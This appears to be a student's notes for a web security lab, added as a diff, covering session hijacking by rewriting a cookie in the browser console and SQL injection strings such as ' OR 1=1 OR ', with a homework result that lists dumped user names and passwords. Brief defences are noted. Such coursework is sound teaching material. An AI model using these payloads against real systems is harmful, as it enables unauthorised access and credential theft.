@@ -1,0 +1,43 @@
+Exercise 1
+
+	Session Hijacking = Use someone else's session identifier (like a cookie or a url parameter value) to fake the own identity with the server
+
+	Login with Max Mustermann --> Look at cookie which stores value "Max" and replace it with "John"
+
+									==> in Chrome: Console -> Enter document.cookie="session=John"
+
+
+	Protection: * associate a session with a location/ip-address/mac to avoid hijacking
+				* 
+
+
+
+
+Exercise 3
+
+	1.
+		' OR 1=1 OR '
+
+	2.
+		Bob' AND (SELECT count(*) FROM gehaelter) > 0 OR '
+		//Bob, because we already found out in exercise 3.1 that Bob exists 
+
+
+	Defence Strategies: * ALWAYS escape user input
+						* https://www.owasp.org/index.php/SQL_Injection_Prevention_Cheat_Sheet
+
+
+Homework
+
+	user:
+		user1' OR 1=1 OR '
+	pass:	
+		' OR 1=1 OR '
+
+
+	Ergebnis:
+		user1	pass1
+		Hans	Giebenrath
+		peter	fkljdbfd
+
+
